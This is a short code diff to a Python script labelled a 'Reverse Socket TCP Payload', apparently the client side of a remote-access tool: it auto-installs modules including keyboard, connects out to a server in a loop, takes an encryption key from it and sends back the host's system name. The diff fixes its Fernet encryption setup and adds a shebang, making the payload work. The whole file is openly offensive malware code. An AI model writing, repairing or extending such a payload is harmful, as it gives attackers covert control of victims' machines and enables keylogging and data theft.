@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 # Reverse Socket TCP Payload
 import os
 import platform
@@ -8,7 +10,7 @@ import importlib
 import subprocess as sp
 import socket
 # list of the modules you have to install manually
-imports = ["requests", "keyboard"]
+imports = ["requests", "keyboard", "cryptography"]
 try:
     for i in imports:
         globals()[i] = importlib.import_module(i)
@@ -19,8 +21,6 @@ except:
         globals()[i] = importlib.import_module(i)
 fernet = ""
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-
 def decrypt(data):
     return fernet.decrypt(data).decode()
 
@@ -40,7 +40,7 @@ while True:
         continue
     print("Connected to Server")
     key = s.recv(1024)
-    fernet = Fernet(key)
+    fernet = globals()["cryptography"].fernet.Fernet(key)
     s.send(encrypt(platform.system()))
     while True:
         try:
